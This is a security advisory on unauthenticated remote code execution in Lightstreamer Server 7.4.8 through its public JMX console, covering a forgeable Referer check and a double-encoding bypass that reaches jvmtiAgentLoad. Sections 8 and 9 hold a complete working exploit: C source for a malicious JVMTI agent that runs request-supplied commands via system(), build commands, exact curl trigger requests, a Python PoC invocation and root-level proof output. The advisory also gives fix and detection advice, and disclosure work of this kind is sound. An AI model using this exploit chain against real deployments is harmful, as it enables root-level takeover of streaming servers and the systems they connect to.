# Lightstreamer Server 7.4.8 — Unauthenticated JMX Diagnostic Command `jvmtiAgentLoad` Leading to Native Code Execution

## 1. Overview

Lightstreamer Server is a commercial Java real-time streaming and messaging broker published by Lightstreamer S.r.l. (Milan, Italy). It is deployed as a Java `tar.gz` distribution that is unpacked and started with `bin/unix-like/LS.sh start` on a JDK 17 runtime. It pushes real-time data streams — financial quotes, news, sports results, collaborative-application state — to browser and mobile clients, and in customer deployments it sits in the communications path rather than beside it.

The version examined here is **Lightstreamer Server 7.4.8 build 3506, ENTERPRISE edition with a demonstration licence (zero-configuration start), together with JMS Extender 2.1.0**.

The server ships an embedded JMX inspection console derived from the `jminix` project, exposed over HTTP at `/dashboard/jmxtree/`. In the configuration file that ships inside the official distribution archive, two elements control whether that console can be reached without credentials:

```xml
<jmxtree_enabled>Y</jmxtree_enabled>
<public>Y</public>
```

Both are `Y` in the shipped file, even though the human-readable comments that sit immediately above them in the same file state that the default is `N`. That is not a transcription quirk: an administrator who reads the documentation and the inline comments will believe the JMX tree is off by default and unauthenticated by design is impossible, while the file that actually governs the running process says the opposite.

With those two shipped values in force, the only remaining gate in front of an MBean invocation is a **`Referer` request-header check** — a value the attacker's HTTP client sets freely. Passing that gate allows an anonymous network client to call *any* MBean operation the JMX server exposes, including `jvmtiAgentLoad` on `com.sun.management:type=DiagnosticCommand`, which instructs the JVM to `dlopen()` an attacker-chosen shared object and run its agent entry point inside the Lightstreamer process.

We verified that a single unauthenticated HTTP POST causes a native JVMTI agent to be loaded and to execute operating-system commands in the context of the service process, which in the verified deployment was `uid=0(root)`, with the one documented precondition named in the same breath: the agent library was already reachable at the path the request names. In our verification it had been placed there beforehand over an authenticated root session on the research host, so what was proven unauthenticated is the request leg, not the delivery leg — sections 9 and 10 carry that limitation explicitly. We derive a conservative primary base score of **CVSS 3.1 8.1 (`AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:H`)** for an attacker with network access only, and **9.8 (`AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H`)** for the deployment shapes where the one documented precondition — the agent library already present on the target filesystem — is satisfied without extra effort. Section 12 shows the reasoning for every metric, including why the precondition keeps the pure-remote score off 9.8 and why `Scope` is `Unchanged`.

- Advisory: https://0day-rubbish.com/blog/lightstreamer-unauth-jmx-jvmti-agentload-rce
- Repository and PoC: https://github.com/Exploit-Garbage/0day-Rubbish
- Contact: disclosure@0day-rubbish.com

## 2. Vulnerability Summary

| Property | Value |
|---|---|
| Product | Lightstreamer Server (plus JMS Extender) |
| Version tested | 7.4.8, build 3506, ENTERPRISE edition with demonstration licence; JMS Extender 2.1.0; JDK 17 |
| Entry point | `POST /dashboard/jmxtree/servers/{server}/{domain}/.../operations/{operation}` |
| Authentication | None. The only check is a client-supplied `Referer` header |
| Root causes | JMX console public by default; MBean operations not allow-listed; `Referer` used as an authentication decision; inconsistent double URL-decoding of the request path |
| Dangerous operation | `com.sun.management:type=DiagnosticCommand` → `jvmtiAgentLoad([Ljava.lang.String;)` |
| Attacker-controlled data | Agent library path (array element 0) and agent options string (array element 1) |
| Verified effect | Native agent entry point runs inside the Lightstreamer JVM; `system()` executed operating-system commands; verified process identity `uid=0(root)` |
| Precondition | The agent shared object must already exist on the target filesystem — `jvmtiAgentLoad` takes a path, it does not fetch a URL |
| CWE | Recorded in the research: CWE-306, CWE-345, CWE-20, CWE-250. Added by this advisory's own classification: CWE-1188 |
| CVSS 3.1 | 8.1 primary (pure remote) / 9.8 where the file precondition is met (see section 12) |
| Identifier | None assigned at the time of writing (see the Independence note) |

## 3. Authentication Boundary

Three nominally distinct security layers sit in front of a client request, and none of them shares state with the others.

| Layer | Mechanism | Controlling configuration | Effective state on plain HTTP |
|---|---|---|---|
| A | TLS mutual/client certificate authentication | `use_client_auth`, `force_client_auth` | Not applicable — the tested endpoint was served over plain HTTP |
| B | HTTP Basic authentication for the dashboard | `<dashboard><public>Y/N</public>` | `Y` in the shipped file, i.e. no credentials are requested |
| C | Application-level `LS_user` / `LS_password` | Forwarded to an optional Metadata Adapter | Not an HTTP-layer gate at all — it belongs to the streaming protocol |

Layer B is therefore the entire HTTP authentication boundary for the JMX tree, and its shipped value disables it. Behind layer B there is exactly one check left, implemented in the dashboard request handler (`x.a.i()`, `x/a.java:60-188`): the request's `Referer` header must match the target host and port and must point at the `/dashboard/` path. A `Referer` header is supplied by the client on every request and costs one flag in `curl` to forge. Treating attacker-controlled request metadata as an authorisation decision is CWE-345, and here it is the sole decision.

One further finding matters for anyone reasoning about this boundary from documentation alone. Two configuration keys that a reader would reasonably expect to gate an administrative HTTP surface — `<http_admin_auth>` and `<http_pool_auth>` — were searched for in both the shipped configuration file and the decompiled server code: they are **absent from both**. HTTP-layer authentication for this surface is decided exclusively by `<dashboard><public>`; there is no second, hidden credential requirement to fall back on.

## 4. Attack Surface

Lightstreamer does not sit on Tomcat, Jetty or any servlet container. It implements its own non-blocking HTTP server, so the usual assumptions about container-managed security constraints, `web.xml` filters or a uniform authentication filter do not transfer. Request dispatch enters at `com.lightstreamer.b.ki:300` and proceeds to `zd.X()` (`zd.java:47`); the route table is built in `gr.c()` (`gr.java:101`). **No authentication filter runs ahead of the routing step**, which is why a route that resolves to an unauthenticated handler is reachable unauthenticated.

Within that surface, `/dashboard/jmxtree/` hosts the `jminix` JMX console. Its operation-invocation endpoint has the shape:

```
POST /dashboard/jmxtree/servers/{server}/{domain}/{mbean-key-properties}/operations/{operation}
Content-Type: application/x-www-form-urlencoded
Referer: http://<target>:<port>/dashboard/

param=<value>
```

Resolving that endpoint reaches `OperationResource.execute()` (`OperationResource.java:88-130`), which parses the operation signature out of the `{operation}` path attribute (splitting on `(` and `)`, lines 65-67 and 94-96), converts each textual request parameter into the type demanded by the signature (line 130), and finally calls the platform MBean server (line 104). The consequence is that the attacker chooses the MBean domain, the MBean key properties, the operation name, the operation signature and the operation arguments — all from a single request. `com.sun.management:type=DiagnosticCommand` is reachable, and its operations include those that dump the heap, dump JVM logs and dump JFR data (`jfrDump`), in addition to `jvmtiAgentLoad`.

Two further surface facts widen exposure. First, in the shipped configuration file the `<listening_interface>` element is left commented out, which means the HTTP listener binds every interface rather than a chosen one; the same file carries `<available_on_all_servers>Y</available_on_all_servers>`. Second, the shipped edition starts with a demonstration licence and no configuration work, so the exposed state is the state an evaluator, a trial user or a rushed deployment lands in.

## 5. Sink Identification

### Sink identification

The sink is the platform diagnostic command that loads a native JVMTI agent:

- MBean: `com.sun.management:type=DiagnosticCommand`
- Operation: `jvmtiAgentLoad`
- Signature: `[Ljava.lang.String;` (a `String[]`)
- Array element 0: filesystem path to the shared object to load
- Array element 1: the options string handed to the agent's entry point

The dispatch call itself is `MBeanServerConnection.invoke(objectName, operation, params, signature)` at `OperationResource.java:104`:

```java
// OperationResource.java:104
server.invoke(new ObjectName(domain + ":" + mbean), operation, params, signature);
```

`jvmtiAgentLoad` asks the HotSpot `DiagnosticCommand` machinery to attach an agent at runtime. That ultimately calls into the operating-system loader for the named shared object and invokes the agent's exported entry point with the JVM handle and the options string. Whatever the shared object does at that moment runs **inside the Lightstreamer process, with the full authority of that process**. Because the options string arrives from the HTTP request, the attacker does not even need to choose the command at agent-compile time.

### Signature gate

An invocation only proceeds if the reconstructed signature exactly equals what the MBean exposes:

```java
// OperationResource.java:158
getParameterList(operationInfo).equals(signature)
```

This is why the encoding behaviour described in section 7 is not a cosmetic detail: producing the literal `[Ljava.lang.String;` after the framework's decoding passes is a hard requirement for the invoke to be reached at all.

## 6. Source Identification

### Source identification

The source is a single anonymous HTTP POST. Nothing in the request chain requires a session cookie, a token, a client certificate, a username or a prior interaction:

```
POST /dashboard/jmxtree/servers/1/com.sun.management/DiagnosticCommand/type%3DDiagnosticCommand/operations/jvmtiAgentLoad%28%255BLjava.lang.String%253B%29 HTTP/1.1
Host: <target>:<port>
Referer: http://<target>:<port>/dashboard/
Content-Type: application/x-www-form-urlencoded

param=/tmp/<agent>.so%3Bid
```

Every security-relevant field is attacker-controlled:

- the MBean `domain` (`com.sun.management`) and key properties (`type=DiagnosticCommand`), taken from the URL path;
- the operation name (`jvmtiAgentLoad`), taken from the URL path;
- the operation signature, reconstructed from the double-encoded URL path;
- the arguments, taken from the `param` body value — element 0 the library path, element 1 the command string executed by the agent;
- the `Referer` header, taken from the request and used as the authorisation decision.

## 7. Data Flow

### Data flow

```
Anonymous HTTP POST (no credentials; forged Referer header)
  |
  v
Lightstreamer NIO HTTP server:  b.ki:300 -> zd.X() (zd.java:47) -> route table gr.c() (gr.java:101)
  |        no authentication filter runs ahead of routing
  v
/dashboard/jmxtree/  ->  jminix (Restlet) resource routing
  |
  v
x.a.i() (x/a.java:60-188)   <-- the only gate: Referer must match host:port and /dashboard/
  v
OperationResource.execute() (OperationResource.java:88-130)
  |   signature parsed from the {operation} path attribute   (lines 65-67, 94-96)
  |   params[i] = parser.parse(stringParams[i], signature[i]) (line 130)
  v
MBeanServerConnection.invoke(objectName, operation, params, signature)  (line 104)
  |   objectName = com.sun.management:type=DiagnosticCommand
  |   operation  = jvmtiAgentLoad
  |   params     = [agent path, options]
  |   signature  = [Ljava.lang.String;
  v
DiagnosticCommand.jvmtiAgentLoad(String[])
  |
  v
Operating-system loader dlopen()s the shared object
  |
  v
Agent_OnAttach(vm, options, reserved)  ->  system(options)
  |
  v
Command executes with the authority of the Lightstreamer JVM process
        (verified identity: uid=0(root))
```

### Sanitisation gap: double URL decoding

`jminix` is served through Restlet 2.4.3, which treats a literal `;` in a URL path as a matrix-parameter separator. Single-encoded `%5B` / `%3B` in the path is therefore consumed by the routing layer, the reconstructed signature comes back empty, parameter parsing throws an `ArrayIndexOutOfBoundsException` at `OperationResource.java:130`, and the client sees a generic `Not found` response.

Two decoding stages exist, and nobody reconciles them. Restlet decodes the path once; `jminix` then decodes again:

```java
// EncoderBean.java:20-22 (jminix applies a second decode)
public String decode(String source) {
    return URLDecoder.decode(source, "UTF-8");   // %5B -> [   %3B -> ;
}
```

Double encoding sits exactly in the gap between the two stages:

1. The attacker sends `%255B` and `%253B`.
2. Restlet decodes once, yielding `%5B` and `%3B` — still percent-forms, so the routing layer does not see a matrix separator and does not swallow anything.
3. `jminix` decodes a second time via `EncoderBean.decode`, yielding the literal `[` and `;`.
4. The signature `[Ljava.lang.String;` is reassembled and satisfies the exact-match comparison at `OperationResource.java:158`.

The same care applies to the separator inside the request body. `ValueParser` splits the parameter value on `;` to build the `String[]`:

```java
// ValueParser.java:14, 65-66
String stringArraySeparator = ";";
String[] values = splitPreserveAllTokens(value, ";");   // [0] = agent path, [1] = options
```

A literal `;` in the body is eaten by the routing layer, so it must be sent as `%3B`, which `jminix` decodes back into the separator that `ValueParser` needs. This is a textbook improper-input-validation defect (CWE-20): two components in the same request path disagree about how many times an encoded string should be decoded.

## 8. Exploit Construction

### Agent library

The payload is a JVMTI agent. One detail determines whether the exploit works at all: an agent attached **at runtime** is entered through `Agent_OnAttach`, not `Agent_OnLoad`. An agent exporting only `Agent_OnLoad` produces `Agent_OnAttach is not available` from the JVM and executes nothing. A working agent exports both, and reads its options string:

```c
#include <stdlib.h>
#include <stdio.h>
#include <string.h>
#include <jni.h>

JNIEXPORT jint JNICALL Agent_OnLoad(JavaVM *vm, char *options, void *reserved) {
    if (options && *options) { char cmd[512]; snprintf(cmd, sizeof(cmd), "%s > /tmp/ls_opt_proof", options); system(cmd); }
    else system("id > /tmp/ls_jmx_rce_proof && echo PWNED_BY_LS_JMX >> /tmp/ls_jmx_rce_proof");
    return 0;
}

JNIEXPORT jint JNICALL Agent_OnAttach(JavaVM *vm, char *options, void *reserved) {
    if (options && *options) { char cmd[512]; snprintf(cmd, sizeof(cmd), "%s > /tmp/ls_opt_proof", options); system(cmd); }
    else system("id > /tmp/ls_jmx_rce_proof && echo PWNED_BY_LS_JMX >> /tmp/ls_jmx_rce_proof");
    return 0;
}
```

Built for an x86-64 Linux target against the target JDK headers (this step happens off-box or on a host with a compiler, and is independent of the request):

```bash
JAVA_INC=$(find /usr/lib/jvm -name jni.h -exec dirname {} \; | head -1)
gcc -shared -fPIC -o /tmp/ls_malicious_agent.so /tmp/ls_agent.c \
    -I"$JAVA_INC" -I"$JAVA_INC/linux"
```

### Trigger request

Two variants were exercised. The first carries no options, so the agent runs its compiled-in marker command; the second passes the command at request time through the options element:

```bash
# marker only
curl -X POST -H 'Referer: http://127.0.0.1:8181/dashboard/' \
  -d 'param=/tmp/ls_malicious_agent.so' \
  'http://127.0.0.1:8181/dashboard/jmxtree/servers/1/com.sun.management/DiagnosticCommand/type%3DDiagnosticCommand/operations/jvmtiAgentLoad%28%255BLjava.lang.String%253B%29'

# arbitrary command chosen at request time (the separator is %3B, not a literal ';')
curl -X POST -H 'Referer: http://127.0.0.1:8181/dashboard/' \
  -d 'param=/tmp/ls_malicious_agent.so%3Bwhoami' \
  'http://127.0.0.1:8181/dashboard/jmxtree/servers/1/com.sun.management/DiagnosticCommand/type%3DDiagnosticCommand/operations/jvmtiAgentLoad%28%255BLjava.lang.String%253B%29'
```

The accompanying Python PoC (`exploit/lightstreamer_unauth_jmx_jvmti_agentload_rce.py`) reproduces the same request with the standard library only:

```bash
python3 exploit/lightstreamer_unauth_jmx_jvmti_agentload_rce.py --host 127.0.0.1 --port 8181 \
  --agent /tmp/ls_malicious_agent.so --command whoami
```

It deliberately uses `http.client` rather than `urllib.request`. `urllib.request` normalises the URL and destroys the `%25` prefix, which collapses the double encoding back into single encoding and re-triggers the swallowed-matrix-parameter failure with a `Not found` response. `http.client` transmits the path bytes as written. The PoC also encodes the body separator as `%3B` and encodes only spaces as `+`, leaving path characters untouched.

## 9. Dynamic Verification

### Verification results

The exact request sent, carrying no credential of any kind:

```
POST /dashboard/jmxtree/servers/1/com.sun.management/DiagnosticCommand/type%3DDiagnosticCommand/operations/jvmtiAgentLoad%28%255BLjava.lang.String%253B%29 HTTP/1.1
Host: 127.0.0.1:8181
Referer: http://127.0.0.1:8181/dashboard/
Content-Type: application/x-www-form-urlencoded

param=/tmp/ls_malicious_agent.so
```

Response:

```
HTTP/1.1 200 OK

"return code: 0\n"
```

`return code: 0` is the diagnostic command's own success value: the agent library was opened and its entry point completed. Effects observed on the target side, across the three variants (compiled-in marker, `id` supplied at request time, `whoami` supplied at request time). The target system's `id` emitted a third, localised group field under that system's own locale; because the blocks below are captured output rather than prose, that field is omitted here and in every later transcript in this section instead of being translated:

```
$ cat /tmp/ls_jmx_rce_proof
uid=0(root) gid=0(root)
PWNED_BY_LS_JMX

$ cat /tmp/ls_opt_proof        # param=/tmp/ls_malicious_agent.so%3Bid
uid=0(root) gid=0(root)

$ cat /tmp/ls_opt_proof        # param=/tmp/ls_malicious_agent.so%3Bwhoami
root
```

The two `curl` runs and the first Python PoC test each recorded `HTTP 200` together with `"return code: 0"`; the PoC's two further tests recorded the resulting marker-file contents rather than a response status. The process identity was confirmed independently of the payload:

```
$ ps -p 1969124 -o pid,user,comm
    PID USER     COMM
1969124 root     java
```

The command strings in the request-time variants (`id`, `whoami`) were chosen by the HTTP client at send time, not baked into the library — which is what proves the options element is a genuine attacker-controlled channel to `system()`, not a fixed demonstration payload.

### Independent re-analysis

The result was re-derived by an independent re-analysis pass working from the product and the source artefacts only, without access to the first run's files. That pass compiled its own agent from scratch (distinct SHA-256), used its own marker string, and reproduced root-level execution, with the same localised-field omission as the transcripts above:

```
$ cat /tmp/ls_independent_rce_proof
INDEPENDENT_REVERIFY_RCE
uid=0(root) gid=0(root)
```

Separately, an adversarial falsification pass was run whose standing position was that the finding does not hold. It attacked six load-bearing claims: that the tested configuration was identical to the shipped one; that the service binds all interfaces by default; that `Referer` is the only gate; that the double-encoding bypass reproduces; that root-level execution reproduces cleanly; and that the chain is fully remote including payload delivery. **The first five held. The sixth did not hold as stated**, and its failure is the most important limitation in this advisory — it is recorded in section 10 rather than smoothed over.

## 10. Reachability and Security Impact

### Reachability

The default-configuration claim rests on artefact evidence, not on the state of the machine we happened to test. The official distribution archive was extracted into a clean directory and its configuration was diffed against the configuration of the running instance. The differences were limited to two items: the listening port (the lab used `8181` instead of the shipped `8080`) and the `<listening_interface>` element, which is commented out in the shipped file — meaning the shipped server binds every interface — and had been set to the loopback address in the lab to limit the research host's exposure. The `<dashboard>` block of the shipped file was byte-identical to the one running, and it contains:

```xml
<jmxtree_enabled>Y</jmxtree_enabled>   <!-- the adjacent comment claims Default: N -->
<public>Y</public>                      <!-- the adjacent comment claims Default: N -->
<available_on_all_servers>Y</available_on_all_servers>
```

So the "unauthenticated by default" part of this advisory is proven from the archive: the shipped values expose the JMX tree, they contradict the documentation sitting next to them, and the shipped listener is not narrowed to one interface. Conversely, the lab instance listened on `127.0.0.1`, and every request in section 9 was sent to `127.0.0.1:8181`. We therefore claim *the shipped configuration exposes the endpoint on all interfaces*, verified by artefact inspection, and *the request sequence works against that endpoint*, verified dynamically — not "we attacked this host across the internet".

Remote unauthenticated reach is an operator choice in one specific sense: setting `<public>N</public>` puts HTTP Basic authentication in front of the dashboard, and setting `<jmxtree_enabled>N</jmxtree_enabled>` removes the JMX tree entirely. Neither value is forced on anyone; both are `Y` as shipped. Section 12 scores that hardened posture separately.

### Delivery precondition

`jvmtiAgentLoad` accepts a filesystem path. It does not retrieve anything. Both `http://` and `file://` forms were submitted as the argument and both were treated as literal path strings — no fetch, no download, no mount. The agent library must therefore already be present on the target's filesystem before the request is sent.

We looked for a way to get it there using only what this endpoint exposes and found none:

- The other file-writing diagnostic operations reachable without authentication (heap dump, JVM log dump, `jfrDump`) emit structured formats — HPROF, log text, JFR — not arbitrary ELF bytes. They cannot be used to write a valid shared object.
- The distribution exposes no HTTP upload endpoint that an anonymous client could use to place a file.

Purely remote exploitation therefore requires one of: an as-yet-unidentified unauthenticated file-write primitive elsewhere in the product or in something co-resident with it, an attacker who already has local access on the target and can therefore place the library, or a co-resident workload that can drop a file. The unauthenticated MBean invocation primitive and the native-code-execution primitive behind it are themselves fully unauthenticated and remote; it is only the *placement of the library* that is gated. We state this plainly because it is the one place where an overclaim would be easy and wrong.

### Impact

Once the library is loaded, execution happens inside the JVM as the service process. In the verified deployment that process ran as root, so the executed commands ran as `uid=0(root)`. We do not claim that root is a factory-mandated identity — the process identity is whatever the launching account was, and the research environment launched it as root. We do claim that the executed code inherits the full identity of the service process, and that in the configuration we verified that identity was root.

- **Confidentiality: High.** Arbitrary command execution in the service process reaches the streaming server's configuration and anything on disk readable by the process. The product's own authentication model names a Metadata Adapter as one of its layers, so credentials configured for that adapter sit inside the same process and fall within its reach. Whether adapter credential material, live process memory or in-flight stream data is in fact readable was not examined in this research; those three reaches are inference from the execution context rather than observation.
- **Integrity: High.** The process can modify its own configuration and adapters, tamper with streamed content, and — as root in the verified deployment — modify the host.
- **Availability: High.** The service can be terminated, its streams corrupted, or the JVM destabilised, both by the loaded agent and by other diagnostic operations reachable through the same unauthenticated endpoint.
- **Persistence and blast radius.** A loaded JVMTI agent would be expected to remain resident in the JVM for the process lifetime, although residency was not observed in this research. A streaming broker commonly holds credentials toward upstream JMS brokers and downstream data sources, so a foothold there is a foothold on the systems it is integrated with.

## 11. Fix Recommendations

Vendor-side, in priority order:

1. **Change the shipped defaults to match the documented defaults.** Ship `<dashboard><public>N</public>` so HTTP Basic authentication is enforced, and ship `<jmxtree_enabled>N</jmxtree_enabled>` so the JMX tree is opt-in. The current file states one thing in comments and does another in values, which is itself a defect independent of the exploit (CWE-306, and CWE-1188 as classified in this advisory).
2. **Stop treating `Referer` as an authentication decision.** It is a client-supplied, trivially forged header. Require a real server-side session or token for any administrative invocation (CWE-345).
3. **Allow-list invocable MBean operations.** A JMX console that permits arbitrary operation invocation against `com.sun.management:type=DiagnosticCommand` is a code-execution feature. `jvmtiAgentLoad` and equivalents should be unreachable from an HTTP-facing console regardless of authentication state.
4. **Resolve the double-decoding inconsistency.** One component should decode the request path, exactly once, and downstream consumers should receive already-decoded values. The Restlet-then-`jminix` pair is what lets the exact signature be reconstructed through the matrix-parameter filter (CWE-20).
5. **Do not run the service as root**, and do not leave the decision implicit — drop to a dedicated service account at startup, or refuse to start as `uid 0` (CWE-250).
6. **Do not bind every interface by default.** Require an explicit `<listening_interface>` for any externally reachable deployment.

Operator hardening available now, without a patch:

7. Set `<dashboard><public>N</public>` and assign strong Basic credentials; set `<jmxtree_enabled>N</jmxtree_enabled>` unless the console is actively needed.
8. Bind the HTTP listener to a management interface only, and place the administration port behind a VPN or mutually authenticated reverse proxy, never on an untrusted network.
9. Run the server as an unprivileged dedicated user and verify the identity with `ps -o user` after start.
10. Monitor request logs for `POST /dashboard/jmxtree/` traffic containing double-encoded path sequences (`%255B`, `%253B`) — that pattern has no legitimate use, and a `200` response carrying `return code: 0` from an anonymous caller should be treated as a compromise indicator.

## 12. CWE and CVSS

### CWE classification

- **CWE-306 — Missing Authentication for Critical Function.** The JMX operation-invocation endpoint, which reaches arbitrary MBean operations, requires no credentials under the shipped configuration.
- **CWE-345 — Insufficient Verification of Data Authenticity.** The single decision standing in front of it is a `Referer` header comparison, i.e. authenticity is inferred from client-supplied metadata.
- **CWE-20 — Improper Input Validation.** Two decoding stages over the same path let a double-encoded signature survive the routing layer's matrix-parameter handling and satisfy the exact-signature comparison.
- **CWE-250 — Execution with Unnecessary Privileges.** The verified process ran as `uid=0(root)`, so the flaw yields host-level authority rather than application-level authority.
- **CWE-1188 — Insecure Default Initialization of Resource.** This one is added by the advisory's own classification; the research recorded CWE-306, CWE-345, CWE-20 and CWE-250. The fact it labels is recorded: shipped values contradict the shipped documentation of those same values.

### Derivation

Each metric, with the fact that drives it:

- **Attack Vector: Network (`AV:N`).** The trigger is an HTTP POST to a listening port; the shipped configuration binds all interfaces and exposes the dashboard publicly. No local logon to the target is needed for the trigger itself.
- **Privileges Required: None (`PR:N`).** No username, password, token, session or certificate is presented at any step. Layer A does not apply on plain HTTP, layer B is `Y` as shipped, layer C is not an HTTP gate. The only header the exploit must carry is one the attacker composes.
- **User Interaction: None (`UI:N`).** No administrator click, no legitimate session, no victim action. The request completes on its own.
- **Attack Complexity.** This is the one metric that legitimately splits, and it splits on the documented delivery precondition. With `AC:H`, the attack cannot be performed at will by a network-only attacker, because a valid native library must already be resident on the target filesystem and the product offers the attacker no primitive to place it — that is effort and preparation outside the endpoint itself. With `AC:L`, the precondition is already satisfied: a co-resident workload can drop the file, an attacker who already has local access on the target can place it, or a separate write primitive can deliver it, after which exploitation is one deterministic HTTP request with no race, no memory-corruption reliability question and no per-target guessing.
- **Scope: Unchanged (`S:U`).** Deliberate and conservative. The agent executes inside the Lightstreamer JVM with the authority that process already held; no sandbox, container or trust boundary was crossed to obtain it. Where the service runs as root the practical consequence reaches the host, and a scorer who reads the host operating system as a distinct security realm would assign `S:C` — that reading yields 9.0 and 10.0 respectively for the two variants below. We publish the `S:U` figures as primary and disclose the `S:C` figures here so the difference is visible rather than buried.
- **Confidentiality / Integrity / Availability: High / High / High.** Verified arbitrary operating-system command execution in the service process, demonstrated as `uid=0(root)`.

### Scores

| Scenario | Vector | Base score |
|---|---|---|
| Purely remote attacker, agent library must be delivered by means outside this endpoint | `AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:H` | **8.1 High** (primary, conservative) |
| Shipped-default exposure, file precondition already satisfied (co-resident writer, an attacker who already holds local access, or a companion write primitive) | `AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H` | **9.8 Critical** |
| Hypothetical scenario, not exercised in this research: a local low-privilege account places the library and the service process is root — read that way it is privilege escalation | `AV:L/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H` | **7.8 High** |
| Operator hardened the shipped values (`<public>N</public>`, so valid dashboard credentials are required) while the delivery precondition still applies | `AV:N/AC:H/PR:L/UI:N/S:U/C:H/I:H/A:H` | **7.5 High** |

We lead with the 8.1 / 9.8 pair rather than a single 9.8 headline. The invocation primitive is unauthenticated and remote on any unmodified installation, and we verified that beyond doubt; the *complete* remote chain additionally needs a file on the target, and the product gave us no way to place it. Presenting 9.8 alone would imply a one-request remote compromise we did not demonstrate. Presenting 8.1 alone would understate the deployments where the precondition is a non-issue. The hardened-configuration row exists because this is precisely the kind of finding where "reachability depends on a setting the operator controls" changes the number, and readers are entitled to both.

### Independence

This finding is our own and is not a re-derivation of published work. The survey recorded during the research phase — across the public vulnerability database and the major vendor-neutral and conference disclosure channels — found **no prior published entries for Lightstreamer Server in the sources checked**. On the substance, the finding would not be covered by a prior entry of the adjacent kind even if one existed, because the primitive here is not a bug in Lightstreamer's streaming protocol or its authentication adapter: it is the unauthenticated exposure of a *platform* JMX console whose operation list includes a native-agent loader, plus the specific double-decoding interaction that makes the loader's exact signature reachable through the routing layer. Any fix limited to the streaming authentication layer, the Metadata Adapter, or JMS Extender would leave this path intact.

No identifier has been assigned to this vulnerability at the time of writing. This advisory will be published at https://0day-rubbish.com/blog/lightstreamer-unauth-jmx-jvmti-agentload-rce, with the PoC and this analysis mirrored at https://github.com/Exploit-Garbage/0day-Rubbish. Technical correspondence about this finding is handled at disclosure@0day-rubbish.com.
